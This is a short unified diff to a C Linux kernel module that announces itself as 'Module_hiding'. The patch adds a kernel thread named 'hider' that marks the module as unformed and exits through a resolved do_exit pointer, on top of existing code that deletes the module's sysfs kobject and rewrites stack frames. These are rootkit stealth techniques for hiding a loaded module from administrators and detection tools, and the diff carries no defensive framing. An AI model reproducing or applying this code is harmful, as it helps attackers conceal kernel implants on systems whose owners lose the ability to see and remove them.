@@ -12,6 +12,7 @@
 #include <linux/kobject.h>
 #include <linux/kernel.h>
 #include <linux/sched.h>
+#include <linux/kthread.h>
 #include <linux/delay.h>
 #include <linux/reboot.h>
 #include <linux/moduleparam.h>
@@ -44,12 +45,19 @@ noinline void skip_parent(void)
     (*rbp)[1] = dummy;
 }
 
+static int postinit(void* data)
+{
+    ((struct module*)(THIS_MODULE))->state = MODULE_STATE_UNFORMED;
+    ((typeof(&do_exit))SM_do_exit)(0);
+    return 0;
+}
+
 int init_module(void){
     struct kobject* mod_kobj = &(((struct module *)(THIS_MODULE))->mkobj).kobj;
 
     printk(KERN_INFO "Module_hiding loaded.\n");
-
     kobject_del(mod_kobj);
+    kthread_run(postinit, NULL, "hider");
 
     return 0;
 }
